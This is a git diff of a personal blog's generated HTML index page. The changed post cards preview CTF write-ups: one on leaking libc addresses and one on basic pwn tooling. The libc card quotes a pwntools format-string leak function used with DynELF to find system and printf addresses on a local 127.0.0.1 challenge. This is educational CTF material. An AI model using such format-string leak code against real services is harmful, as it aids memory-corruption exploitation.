@@ -222,6 +222,12 @@
             
               <div class="item">
                 <div class="content">
+                  <a class="item" href="/post/2021-09-24_ctf-tools/">CTF基本工具使用指北</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
                   <a class="item" href="/post/2021-04-07_iteration-and-recurtion/">迭代与递归</a>
                 </div>
               </div>
@@ -387,7 +393,7 @@
       <article class="ui attached segment card dream-card">
   <a class="image" href="https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/">
     
-      <img src="/img/default1.jpg" alt="libc泄漏" />
+      <img src="/img/default3.jpg" alt="libc泄漏" />
     
   </a>
 
@@ -400,8 +406,9 @@
     </div>
     <div class="description">
       libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。 ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。 fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。 堆利用中也会有用system覆盖函数got的利用方式。
-格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
-def leak(addr): p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;) p.recvline() payload = &#34;%9$s.AAA&#34; + p32(addr) p.sendline(payload) data = p.recvuntil(&#34;.AAA&#34;)[:-4] + &#34;\x00&#34; log.info(&#34;leaking: 0x%x--&gt; %s&#34; % (addr, data.encode(&#39;hex&#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&#39;system&#39;, &#39;libc&#39;) printf_addr = data.lookup(&#39;printf&#39;, &#39;libc&#39;) log.info(&#34;system address: 0x%x&#34; % system_addr) log.info(&#34;printf address: 0x%x&#34; % printf_addr)   DynELF 不要求我们拿到 libc.
+常见泄漏方法  未知libc版本时  常用的泄漏方法有泄漏某个函数的got内容，根据泄漏的地址用LibcSearcher搜索libc。函数的got地址可以用ELF在目标二进制文件中搜到。 在可以泄漏任意地址内容的时候可以用DynELF。
+    格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
+def leak(addr): p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;) p.recvline() payload = &#34;%9$s.AAA&#34; + p32(addr) p.sendline(payload) data = p.recvuntil(&#34;.AAA&#34;)[:-4] + &#34;\x00&#34; log.info(&#34;leaking: 0x%x--&gt; %s&#34; % (addr, data.encode(&#39;hex&#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&#39;system&#39;, &#39;libc&#39;) printf_addr = data.lookup(&#39;printf&#39;, &#39;libc&#39;) log.info(&#34;system address: 0x%x&#34; % system_addr) log.
     </div>
   </div>
 
@@ -409,6 +416,40 @@ def leak(addr): p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;) p.recvline() pa
     <div class="author">@&nbsp;Iluvata</div>
     <div class="reading-time">
       <i class="clock icon"></i>1 minutes read</div>
+  </div>
+</article>
+
+    </div>
+  
+    <div class="sixteen wide mobile eight wide tablet eight wide computer four wide large screen four wide widescreen column dream-column">
+      <article class="ui attached segment card dream-card">
+  <a class="image" href="https://iluvata.github.io/post/2021-09-24_ctf-tools/">
+    
+      <img src="/img/default4.jpg" alt="CTF基本工具使用指北" />
+    
+  </a>
+
+  <div class="content">
+    <h2 class="ui medium header">
+      <a href="/post/2021-09-24_ctf-tools/">CTF基本工具使用指北</a>
+    </h2>
+    <div class="meta">
+      <p class="date">Friday, Sep 24, 2021</p>
+    </div>
+    <div class="description">
+      环境搭建  在mac上我觉得比较好用的环境是multipass中ubuntu虚拟机+宿主机中的idapro，以及宿主机上vscode写python wp，在虚拟机中运行。
+ multipass默认分配的内存和磁盘不太够用，建议内存分4G，磁盘分15G。ubuntu版本选择16.04. 虚拟机内环境配置可以参考pwn-env-init，建议使用py2. 但是脚本是用apt-get安装pip的，可能会有些问题，需要 curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py 然后运行 get-pip.py 。还有 one_gadget 目前需要ruby版本高于2.4，apt-get安装的ruby是2.3。可以执行下面的命令安装
+$ sudo apt-add-repository ppa:brightbox/ruby-ng $ sudo apt-get update $ sudo apt-get install ruby2.4 ruby2.4-dev $ ruby2.4 -v   还可以装个 tmux ，在pwntools连接gdb调试的时候在开头加上下面代码就可以分出调试窗口（虽然我现在也还没配好pwntools舒服地连gdb的环境。。。）。
+context.arch=&#34;amd64&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]    pwntools  io交互  连接
+本地 ：sh = porcess(&#34;./level0&#34;) 远程：sh = remote(&#34;127.0.0.1&#34;,10001) 关闭连接：sh.close()   io
+sh.send(data) 发送数据 sh.sendline(data) 发送一行数据，相当于在数据后面加\n sh.recv(numb = 2048, timeout = dufault) 接受数据，numb指定接收的字节，timeout指定超时 sh.
+    </div>
+  </div>
+
+  <div class="extra content">
+    <div class="author">@&nbsp;Iluvata</div>
+    <div class="reading-time">
+      <i class="clock icon"></i>3 minutes read</div>
   </div>
 </article>
 
@@ -701,49 +742,20 @@ UEFI  Unified Extensible Firmware Interface 统一可拓展固件接口。堆栈
 
     </div>
   
-    <div class="sixteen wide mobile eight wide tablet eight wide computer four wide large screen four wide widescreen column dream-column">
-      <article class="ui attached segment card dream-card">
-  <a class="image" href="https://iluvata.github.io/post/2021-02-19_dp-and-warshall/">
-    
-      <img src="/img/2021-02-19_dijkstra.jpg" alt="理解动态规划与warshall算法" />
-    
-  </a>
-
-  <div class="content">
-    <h2 class="ui medium header">
-      <a href="/post/2021-02-19_dp-and-warshall/">理解动态规划与warshall算法</a>
-    </h2>
-    <div class="meta">
-      <p class="date">Friday, Feb 19, 2021</p>
-    </div>
-    <div class="description">
-      今天刚好在离散里学了用来计算传递闭包的warshall算法，就在这里把离散里计算闭包的算法 和动态规划一起整理一下。
-集合、关系和闭包  要理解闭包首先需要了解集合和关系（函数）。 在离散数学中我们讨论的集合都是非公理化的朴素集合论（会导致罗素悖论）。有时间可以了解下公理集合论。
-关系与函数  关系： 关系是一个集合中的元素到另一个集合中元素的映射方式。二元关系是两个集合笛卡尔积的子集。 关系能够具有的性质包括自反性，对称性，传递性，反自反性，反对称性。具有自反、堆成、传递性 的关系称为等价关系。其他的特殊关系有偏序（包含全序、良序、字典序）
- 函数：函数可以看作一种特殊的关系。 函数是每个定义域中元素到唯一一个值域中元素的映射.
- A function from A to B is an assignment of exactly one element of B to each element of A.
- 函数的种类包括
-  单射 一一对应(one-to-one)函数：如果定义域中的两个元素不相等，那值域中对应的两个元素也肯定不相等.
-  满射（onto）函数：值域中每个值都有对应的定义域元素.
-  双射： 满足单射及满射
-    闭包  闭包：一个集合具有某个性质的最小超集。例如在一个集合S上关系R的自反闭包是R并S0, S0是集合S中所有元素到自身关系的集合。 其他常用的闭包还有对称闭包和传递闭包。自反闭包记作r(R),对称闭包s(R),传递闭包t(R).
- 一个关系的自反闭包与对称闭包计算都很简单，传递闭包要麻烦些。一个具有传递性的关系是指在该关系中， 如果出现了(a,b)和(b,c)，则(a,c)也存在。想得到一个关系具有传递性的最小超集，我们要检查当前该关系中所有满足(a,b) (b,c) 的pair，得到(a,c)后加入。但是只进行一次后不一定能得到我们想要的传递性关系。比如原先关系R为{(a,b), (b,c), (c,d)}, 进行一次计算后得到的R1是{(a,b), (b,c), (c,d), (a,c), (b,d)}。R1中存在(a,b)和(b,d)，但是没有(a,d)，并不是我们想要的 自反闭包。我们需要再做一次相同的步骤。在一个无穷关系中，相同的步骤需要执行无穷次。这就是计算传递闭包的算法。
-    </div>
-  </div>
-
-  <div class="extra content">
-    <div class="author">@&nbsp;Iluvata</div>
-    <div class="reading-time">
-      <i class="clock icon"></i>2 minutes read</div>
-  </div>
-</article>
-
-    </div>
-  
 
   <div class="sixteen wide mobile eight wide tablet eight wide computer four wide large screen four wide widescreen column dream-column">
     
 
+
+<article class="ui attached center aligned segment card dream-card">
+  <div class="content">
+    <div class="ui medium header">
+      <a href="/categories/learning/page/2/" title="Next page">
+        Next page
+      </a>
+    </div>
+  </div>
+</article>
 
 
   </div>
